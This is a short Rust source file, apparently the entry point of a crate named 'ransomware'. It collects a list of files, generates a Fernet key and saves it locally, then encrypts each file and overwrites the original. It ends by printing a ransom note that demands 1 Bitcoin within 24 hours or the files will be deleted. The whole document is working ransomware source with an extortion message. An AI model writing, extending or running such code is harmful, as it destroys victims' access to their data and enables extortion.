use fernet::Fernet;
use ransomware::get_filenames;
use std::fs;

fn main() -> std::io::Result<()> {
    let files: Vec<String> = get_filenames()?;

    if !files.is_empty() {
        let key: String = Fernet::generate_key();
        let fernet = Fernet::new(&key).unwrap();

        fs::write("my_key.key", key)?;

        for file in files {
            let content: String = fs::read_to_string(&file)?;
            let token: String = fernet.encrypt(content.as_bytes());

            fs::write(file, token)?;
        }
    }

    println!(
        "All of your files are encrypted. You have 24 hrs send me 1 Bitcoin otherwise I will delete everything."
    );
    Ok(())
}
